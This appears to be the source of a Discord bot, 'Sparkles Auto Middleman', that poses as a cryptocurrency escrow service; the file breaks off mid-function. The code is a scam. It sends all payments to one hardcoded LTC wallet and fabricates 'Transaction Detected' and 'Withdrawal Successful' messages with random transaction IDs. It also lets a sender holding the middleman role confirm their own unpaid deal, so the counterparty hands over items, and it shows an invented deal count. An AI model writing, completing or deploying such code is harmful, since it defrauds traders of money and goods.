const { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  StringSelectMenuBuilder, 
  ButtonBuilder, 
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType, 
  PermissionsBitField,
  EmbedBuilder
} = require('discord.js');
const axios = require('axios');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildMembers
  ]
});

require('events').EventEmitter.defaultMaxListeners = 20;

// ========== CONFIGURATION ==========
const OWNER_ID = '1282001169274638376';
const TICKET_CHANNEL_ID = '1484995433037041734';
const MIDDLEMAN_ROLE_ID = '1485011076923003090';
const LOGS_CHANNEL_ID = '1484995546249953280';

const FEES = {
  over250: 1.50,
  under250: 0.50,
  free: 0.00,
  freeThreshold: 50,
  over250Threshold: 250
};

// Store data
const trades = new Map();
const stepStates = new Map();
const userPurchases = new Map();
const roleConfirmations = new Map();
const amountConfirmations = new Map();
const feeConfirmations = new Map();

let liveRates = {
  ltc: 55.83,
  usdt: 1.00,
};

async function fetchLiveRates() {
  try {
    const response = await axios.get('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT', { timeout: 5000 });
    if (response.data && response.data.price) {
      liveRates.ltc = parseFloat(response.data.price);
      console.log(`📊 LTC Price: $${liveRates.ltc.toFixed(2)}`);
    }
  } catch (error) {}
}

setInterval(fetchLiveRates, 2 * 60 * 60 * 1000);

function generateLTCAddress() {
  const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  let address = Math.random() > 0.5 ? 'L' : 'M';
  for (let i = 0; i < 33; i++) address += chars.charAt(Math.floor(Math.random() * chars.length));
  return address;
}

function generateTransactionId() {
  const chars = '0123456789abcdef';
  let id = '';
  for (let i = 0; i < 64; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
  return id;
}

// ========== FIND USER FUNCTION ==========
async function findUser(guild, input) {
  input = input.trim().replace(/[@]/g, '');
  
  console.log(`🔍 Searching for user: "${input}"`);
  
  try {
    await guild.members.fetch();
  } catch(e) {
    console.log('Could not fetch all members');
  }
  
  if (input.match(/^\d+$/)) {
    try {
      const user = await client.users.fetch(input);
      console.log(`✅ Found by ID: ${user.tag}`);
      return { id: user.id, name: user.username, found: true };
    } catch(e) {}
  }
  
  let member = guild.members.cache.find(m => 
    m.user.username.toLowerCase() === input.toLowerCase()
  );
  if (member) {
    console.log(`✅ Found by exact username: ${member.user.tag}`);
    return { id: member.id, name: member.user.username, found: true };
  }
  
  member = guild.members.cache.find(m => 
    m.displayName.toLowerCase() === input.toLowerCase()
  );
  if (member) {
    console.log(`✅ Found by display name: ${member.user.tag}`);
    return { id: member.id, name: member.user.username, found: true };
  }
  
  member = guild.members.cache.find(m => 
    m.user.username.toLowerCase().includes(input.toLowerCase())
  );
  if (member) {
    console.log(`✅ Found by partial username: ${member.user.tag}`);
    return { id: member.id, name: member.user.username, found: true };
  }
  
  console.log(`❌ Could not find user: "${input}"`);
  return { id: null, name: input, found: false };
}

// ========== SEND PAYMENT INVOICE ==========
async function sendPaymentInvoice(channel, trade) {
  const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
  const walletAddress = "Lei7Rwf1AvJg6sqhHjbKvkirzXqa6ZSLtET";
  
  let totalUSD = trade.amountUSD;
  if (trade.feePayer === trade.senderId) totalUSD = trade.amountUSD + trade.feeUSD;
  else if (trade.feePayer === trade.receiverId) totalUSD = trade.amountUSD + trade.feeUSD;
  else if (trade.feePayer === 'split') totalUSD = trade.amountUSD + (trade.feeUSD / 2);
  
  const totalCrypto = (totalUSD / rate).toFixed(8);
  
  const embed = new EmbedBuilder()
    .setTitle('💸 Payment Information')
    .setColor(0xff9900)
    .setDescription(`<@${trade.senderId}> Send the ${trade.crypto.toUpperCase()} to the following address.`)
    .addFields(
      { name: 'USD Amount', value: `$${trade.amountUSD.toFixed(2)}`, inline: true },
      { name: 'LTC Amount', value: `${trade.amountCrypto}`, inline: true },
      { name: 'Payment Address', value: `\`${walletAddress}\``, inline: false },
      { name: 'Current LTC Price', value: `$${rate.toFixed(2)}`, inline: true }
    )
    .setTimestamp();
  
  const copyRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`copy_${trade.channelId}`).setLabel('Copy Details').setStyle(ButtonStyle.Secondary)
  );
  
  await channel.send({ embeds: [embed], components: [copyRow] });
  
  const guild = channel.guild;
  const sender = guild.members.cache.get(trade.senderId);
  const middlemanRole = guild.roles.cache.get(MIDDLEMAN_ROLE_ID);
  
  if (sender && middlemanRole && sender.roles.cache.has(MIDDLEMAN_ROLE_ID)) {
    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`dm_confirm_${trade.channelId}`).setLabel('✅ Confirm Payment').setStyle(ButtonStyle.Success)
    );
    
    const dmEmbed = new EmbedBuilder()
      .setTitle('🔔 Payment Confirmation Required')
      .setColor(0x0099ff)
      .addFields(
        { name: 'Sender', value: `<@${trade.senderId}>`, inline: true },
        { name: 'Receiver', value: `<@${trade.receiverId}>`, inline: true },
        { name: 'Amount', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()} ($${trade.amountUSD})`, inline: true },
        { name: 'Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD}` : 'FREE', inline: true }
      );
    
    try {
      await sender.send({ embeds: [dmEmbed], components: [confirmRow] });
    } catch(e) {}
  }
}

// ========== CLIENT READY ==========
client.once('ready', async () => {
  console.log(`✨ Sparkles Auto Middleman online as ${client.user.tag}`);
  
  client.user.setPresence({
    activities: [{ name: '5,461 deals | sparklesmm.cloud', type: 3 }],
    status: 'online'
  });
  
  await fetchLiveRates();
  
  const channel = client.channels.cache.get(TICKET_CHANNEL_ID);
  if (!channel) return;
  
  const messages = await channel.messages.fetch({ limit: 10 });
  const oldPanel = messages.find(m => m.author.id === client.user.id);
  if (oldPanel) await oldPanel.delete();
  
  const row = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder()
      .setCustomId('crypto_select')
      .setPlaceholder('💰 Select your cryptocurrency')
      .addOptions(
        { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
        { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
      )
  );
  
  const panelEmbed = new EmbedBuilder()
    .setTitle('# ✨ Sparkles Auto Middleman')
    .setColor(0xff69b4)
    .setDescription('**Paid Service**\nRead our ToS before using the bot: `#tos`')
    .addFields(
      { name: '💰 Fees', value: `• Deals $250+: **$${FEES.over250}**\n• Deals under $250: **$${FEES.under250}**\n• Deals under $${FEES.freeThreshold}: **FREE**`, inline: true },
      { name: '📊 Live Rate', value: `**LTC:** $${liveRates.ltc.toFixed(2)}`, inline: true }
    )
    .setFooter({ text: 'Sparkles Auto Middleman' })
    .setTimestamp();
  
  await channel.send({ embeds: [panelEmbed], components: [row] });
  console.log('✅ Ticket panel sent');
});

// ========== PANEL COMMAND ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (message.content === '!panel' && message.author.id === OWNER_ID) {
    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId('crypto_select')
        .setPlaceholder('💰 Select your cryptocurrency')
        .addOptions(
          { label: '📀 Litecoin (LTC)', value: 'ltc', emoji: '💎' },
          { label: '💵 Tether USDT (BEP-20)', value: 'usdt', emoji: '💰' }
        )
    );
    
    const panelEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman')
      .setColor(0xff69b4)
      .setDescription('**Paid Service**\nRead our ToS before using the bot: `#tos`')
      .addFields(
        { name: '💰 Fees', value: `• Deals $250+: **$${FEES.over250}**\n• Deals under $250: **$${FEES.under250}**\n• Deals under $${FEES.freeThreshold}: **FREE**`, inline: true },
        { name: '📊 Live Rate', value: `**LTC:** $${liveRates.ltc.toFixed(2)}`, inline: true }
      )
      .setFooter({ text: 'Sparkles Auto Middleman' })
      .setTimestamp();
    
    await message.channel.send({ embeds: [panelEmbed], components: [row] });
    await message.reply('✅ Panel sent!');
  }
});

// ========== PURCHASES COMMANDS ==========
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.guild) return;
  
  if (message.content === '$purchases') {
    const total = userPurchases.get(message.author.id) || 0;
    const embed = new EmbedBuilder()
      .setTitle('💰 Purchase History')
      .setColor(0x00ff00)
      .setThumbnail(message.author.displayAvatarURL({ dynamic: true }))
      .setDescription(`**${message.author.username}** has spent: **$${total.toFixed(2)}**`);
    await message.reply({ embeds: [embed] });
  }
  
  if (message.content.startsWith('$addpurchases')) {
    const hasAdmin = message.member.permissions.has(PermissionsBitField.Flags.Administrator);
    if (!hasAdmin) return message.reply('❌ Admin only');
    const args = message.content.split(' ');
    let amount = parseFloat(args[1]?.replace('$', ''));
    if (isNaN(amount)) return message.reply('Usage: $addpurchases 150');
    let targetUser = message.author;
    if (message.mentions.users.size > 0) {
      targetUser = message.mentions.users.first();
      amount = parseFloat(args[2]?.replace('$', ''));
    }
    const current = userPurchases.get(targetUser.id) || 0;
    const newTotal = current + amount;
    userPurchases.set(targetUser.id, newTotal);
    await message.reply(`✅ Added $${amount} to ${targetUser.username}. New total: $${newTotal}`);
  }
});

// ========== TICKET CREATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'crypto_select') return;
  
  const crypto = interaction.values[0];
  
  const modal = new ModalBuilder()
    .setCustomId(`trade_form_${interaction.user.id}`)
    .setTitle('Create New Trade');
  
  const traderInput = new TextInputBuilder()
    .setCustomId('trader')
    .setLabel("Trader's Username")
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('Type their username (e.g., john123)')
    .setRequired(true);
  
  const givingInput = new TextInputBuilder()
    .setCustomId('giving')
    .setLabel('What are you giving?')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('e.g., 50 LTC / Game item')
    .setRequired(true);
  
  const receivingInput = new TextInputBuilder()
    .setCustomId('receiving')
    .setLabel('What is trader giving?')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('e.g., 0.5 BTC / Service')
    .setRequired(true);
  
  modal.addComponents(
    new ActionRowBuilder().addComponents(traderInput),
    new ActionRowBuilder().addComponents(givingInput),
    new ActionRowBuilder().addComponents(receivingInput)
  );
  
  stepStates.set(`temp_${interaction.user.id}`, { crypto });
  await interaction.showModal(modal);
});

// ========== FORM SUBMISSION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('trade_form_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const userId = interaction.customId.split('_')[2];
  if (userId !== interaction.user.id) return;
  
  const tempData = stepStates.get(`temp_${userId}`);
  if (!tempData) {
    await interaction.editReply({ content: '❌ Session expired' });
    return;
  }
  
  const traderInput = interaction.fields.getTextInputValue('trader');
  const giving = interaction.fields.getTextInputValue('giving');
  const receiving = interaction.fields.getTextInputValue('receiving');
  
  const found = await findUser(interaction.guild, traderInput);
  
  try {
    const ticketNumber = Math.floor(Math.random() * 9000) + 1000;
    const channelName = `${tempData.crypto}-${interaction.user.username}-${ticketNumber}`;
    
    const channel = await interaction.guild.channels.create({
      name: channelName,
      type: ChannelType.GuildText,
      permissionOverwrites: [
        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
      ]
    });
    
    if (found.found && found.id) {
      await channel.permissionOverwrites.create(found.id, {
        ViewChannel: true, SendMessages: true, ReadMessageHistory: true
      });
    }
    
    trades.set(channel.id, {
      crypto: tempData.crypto,
      ticketNumber: ticketNumber,
      trader1Id: interaction.user.id,
      trader1Name: interaction.user.username,
      trader2Id: found.found ? found.id : null,
      trader2Name: found.name,
      trader1Item: giving,
      trader2Item: receiving,
      senderId: null,
      receiverId: null,
      amountUSD: null,
      amountCrypto: null,
      feeUSD: 0,
      feePayer: null,
      status: 'waiting_roles',
      channelId: channel.id,
      exchangeRateUsed: liveRates[tempData.crypto],
      paymentConfirmed: false
    });
    
    await interaction.editReply({ content: `✅ Ticket created: ${channel}` });
    
    const traderMention = found.found ? `<@${found.id}>` : found.name;
    
    const detailsEmbed = new EmbedBuilder()
      .setTitle('# ✨ Sparkles Auto Middleman Service')
      .setColor(0xff69b4)
      .setDescription(`${interaction.user} ${traderMention}`)
      .addFields(
        { name: 'Instructions', value: 'Please explicitly state the trade details if inaccurate.\nBy using this bot, you agree to our ToS.', inline: false },
        { name: `${interaction.user.username}'s side:`, value: giving, inline: true },
        { name: `${found.name}'s side:`, value: receiving, inline: true }
      )
      .setTimestamp();
    
    const deleteRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`delete_${channel.id}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger)
    );
    await channel.send({ embeds: [detailsEmbed], components: [deleteRow] });
    
    await channel.send({ content: `✨ **Welcome to your trade ticket!**\n${interaction.user} ${found.found ? `<@${found.id}>` : ''}\n\nPlease select your roles below.` });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channel.id}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channel.id}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channel.id}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await channel.send({ content: '**Select your role:**', components: [roleRow] });
    
    stepStates.delete(`temp_${userId}`);
  } catch (error) {
    console.error(error);
    await interaction.editReply({ content: '❌ Error creating ticket!' });
  }
});

// ========== DELETE TICKET ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('delete_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply('🗑️ Deleting ticket...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

// ========== ROLE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('sender_') && !interaction.customId.startsWith('receiver_') && !interaction.customId.startsWith('reset_')) return;
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  if (interaction.customId.startsWith('reset_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', ephemeral: true });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (interaction.customId.startsWith('sender_')) {
    trade.senderId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Sender', ephemeral: true });
  } else {
    trade.receiverId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Receiver', ephemeral: true });
  }
  trades.set(channelId, trade);
  
  if (trade.senderId && trade.receiverId && !roleConfirmations.has(channelId)) {
    roleConfirmations.set(channelId, []);
    
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_roles_${channelId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`incorrect_roles_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
    );
    const embed = new EmbedBuilder()
      .setTitle('Is This Information Correct?')
      .setColor(0xff9900)
      .setDescription(`**Sender**\n<@${trade.senderId}>\n\n**Receiver**\n<@${trade.receiverId}>`);
    await interaction.channel.send({ embeds: [embed], components: [row] });
  }
});

// ========== ROLE CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_roles_') && !interaction.customId.startsWith('incorrect_roles_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const confirmed = roleConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_roles_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', ephemeral: true });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    roleConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed`, ephemeral: false });
  } else {
    return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    roleConfirmations.delete(channelId);
    
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set USD Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
  }
});

// ========== SET AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('set_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only sender', ephemeral: true });
  
  const modal = new ModalBuilder()
    .setCustomId(`amount_modal_${channelId}`)
    .setTitle('Set USD Amount');
  const input = new TextInputBuilder()
    .setCustomId('amount')
    .setLabel('USD Amount')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('50.00')
    .setRequired(true);
  modal.addComponents(new ActionRowBuilder().addComponents(input));
  await interaction.showModal(modal);
});

// ========== HANDLE AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('amount_modal_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const amountUSD = parseFloat(interaction.fields.getTextInputValue('amount'));
  if (isNaN(amountUSD) || amountUSD <= 0) {
    await interaction.editReply({ content: 'Invalid amount' });
    return;
  }
  
  trade.amountUSD = amountUSD;
  const rate = liveRates[trade.crypto];
  trade.exchangeRateUsed = rate;
  trade.amountCrypto = (amountUSD / rate).toFixed(8);
  
  if (amountUSD >= FEES.over250Threshold) trade.feeUSD = FEES.over250;
  else if (amountUSD >= FEES.freeThreshold) trade.feeUSD = FEES.under250;
  else trade.feeUSD = 0;
  
  trades.set(channelId, trade);
  
  const amountEmbed = new EmbedBuilder()
    .setTitle('💰 Amount Summary')
    .setColor(0x00ff00)
    .setDescription(`**Amount:** $${amountUSD.toFixed(2)} USD`)
    .addFields(
      { name: '💎 Crypto Equivalent', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
      { name: '📊 Exchange Rate', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
      { name: '💸 Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD.toFixed(2)}` : '**FREE** (under $50)', inline: true }
    )
    .setFooter({ text: 'Both users must confirm this amount' });
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${channelId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
  );
  
  await interaction.editReply({ content: '✅ Amount set! Please confirm below.' });
  await interaction.channel.send({ embeds: [amountEmbed], components: [row] });
  amountConfirmations.set(channelId, []);
});

// ========== AMOUNT CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_amount_') && !interaction.customId.startsWith('incorrect_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const confirmed = amountConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_amount_')) {
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.reply({ content: 'Set amount again', ephemeral: true });
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
    amountConfirmations.delete(channelId);
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    amountConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed the amount`, ephemeral: false });
  } else {
    return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    amountConfirmations.delete(channelId);
    
    if (trade.feeUSD === 0) {
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('Select Who Pays the Fee')
        .setColor(0xff9900)
        .setDescription(`Fee: $${trade.feeUSD}`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== FEE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('fee_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const state = feeConfirmations.get(channelId);
  if (!state) return;
  
  let selected = null;
  if (interaction.customId.startsWith('fee_sender')) selected = 'sender';
  else if (interaction.customId.startsWith('fee_receiver')) selected = 'receiver';
  else selected = 'split';
  
  if (!state.users.includes(interaction.user.id)) {
    state.users.push(interaction.user.id);
    if (!state.selected) state.selected = selected;
    feeConfirmations.set(channelId, state);
    await interaction.reply({ content: `✅ ${interaction.user.username} selected: ${selected}`, ephemeral: true });
  } else {
    return interaction.reply({ content: 'Already selected', ephemeral: true });
  }
  
  if (state.users.length === 2 && state.users.includes(trade.senderId) && state.users.includes(trade.receiverId)) {
    if (state.selected === selected) {
      if (state.selected === 'sender') trade.feePayer = trade.senderId;
      else if (state.selected === 'receiver') trade.feePayer = trade.receiverId;
      else trade.feePayer = 'split';
      
      trades.set(channelId, trade);
      feeConfirmations.delete(channelId);
      await interaction.channel.send(`✅ Fee paid by: ${state.selected.toUpperCase()}`);
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      await interaction.channel.send('❌ Fee mismatch! Try again.');
      feeConfirmations.delete(channelId);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      await interaction.channel.send({ components: [row] });
    }
  }
});

// ========== DM CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('dm_confirm_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Not authorized', ephemeral: true });
  if (trade.paymentConfirmed) return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  
  trade.paymentConfirmed = true;
  trades.set(channelId, trade);
  await interaction.reply({ content: '✅ Payment confirmed!', ephemeral: true });
  
  const ticketChannel = await client.channels.fetch(channelId);
  if (ticketChannel) {
    const txId = generateTransactionId();
    const shortTxId = txId.substring(0, 12) + '...' + txId.substring(52, 64);
    
    const detectedEmbed = new EmbedBuilder()
      .setTitle('📡 Transaction Detected')
      .setColor(0xff9900)
      .addFields(
        { name: 'Transaction', value: `${shortTxId} (${trade.amountCrypto} LTC)`, inline: false },
        { name: 'Amount Received', value: `${trade.amountCrypto} LTC ($${trade.amountUSD})`, inline: true },
        { name: 'Required Amount', value: `${trade.amountCrypto} LTC ($${trade.amountUSD})`, inline: true }
      );
    await ticketChannel.send({ embeds: [detectedEmbed] });
    
    const confirmedEmbed = new EmbedBuilder()
      .setTitle('✅ Transaction Confirmed!')
      .setColor(0x00ff00)
      .addFields({ name: 'Total Amount Received', value: `${trade.amountCrypto} LTC ($${trade.amountUSD})`, inline: true });
    await ticketChannel.send({ embeds: [confirmedEmbed] });
    
    const proceedEmbed = new EmbedBuilder()
      .setTitle('✅ You may proceed with your trade.')
      .setColor(0x00ff00)
      .setDescription(`1. <@${trade.receiverId}> Give your trader the items.\n\n2. <@${trade.senderId}> Click "Release" when received.`);
    
    const releaseRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`release_${trade.channelId}`).setLabel('🔓 Release').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`cancel_${trade.channelId}`).setLabel('❌ Cancel').setStyle(ButtonStyle.Danger)
    );
    await ticketChannel.send({ embeds: [proceedEmbed], components: [releaseRow] });
  }
});

// ========== RELEASE ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('release_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (!trade) return;
    if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only sender', ephemeral: true });
    if (!trade.paymentConfirmed) return interaction.reply({ content: 'Payment not confirmed', ephemeral: true });
    
    const modal = new ModalBuilder()
      .setCustomId(`wallet_${channelId}`)
      .setTitle('Enter LTC Address');
    const input = new TextInputBuilder()
      .setCustomId('wallet')
      .setLabel('Your LTC Address')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('LLjBjgFtV2K2iRqvHEUTmL7aVaKGc7SncG')
      .setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }
  
  if (interaction.customId.startsWith('cancel_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply('❌ Cancelled. Closing...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 5000);
  }
  
  if (interaction.customId.startsWith('copy_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (trade) {
      const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
      let totalUSD = trade.amountUSD;
      if (trade.feePayer === trade.senderId || trade.feePayer === trade.receiverId) totalUSD = trade.amountUSD + trade.feeUSD;
      else if (trade.feePayer === 'split') totalUSD = trade.amountUSD + (trade.feeUSD / 2);
      const totalCrypto = (totalUSD / rate).toFixed(8);
      const details = `Address: Lei7Rwf1AvJg6sqhHjbKvkirzXqa6ZSLtET\nAmount: ${totalCrypto} ${trade.crypto.toUpperCase()}`;
      await interaction.reply({ content: `📋 Copied!\n\`\`\`${details}\`\`\``, ephemeral: true });
    }
  }
});

// ========== WALLET & COMPLETION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('wallet_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const wallet = interaction.fields.getTextInputValue('wallet');
  
  const txId = generateTransactionId();
  const shortTxId = txId.substring(0, 12) + '...' + txId.substring(52, 64);
  const amountSent = trade.amountCrypto;
  const usdValue = (parseFloat(amountSent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
  
  const withdrawalEmbed = new EmbedBuilder()
    .setTitle('✅ Withdrawal Successful')
    .setColor(0x00ff00)
    .addFields(
      { name: 'Transaction', value: shortTxId, inline: false },
      { name: 'Amount Sent', value: `${amountSent} LTC ($${usdValue})`, inline: true }
    );
  
  const closeRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`close_ticket_${channelId}`).setLabel('Close Ticket').setStyle(ButtonStyle.Primary)
  );
  await interaction.channel.send({ embeds: [withdrawalEmbed], components: [closeRow] });
  await interaction.editReply({ content: '✅ Trade completed!' });
  
  // Add purchase to sender
  const currentTotal = userPurchases.get(trade.senderId) || 0;
  const newTotal = currentTotal + trade.amountUSD;
  userPurchases.set(trade.senderId, newTotal);
  
  // Log to logs channel
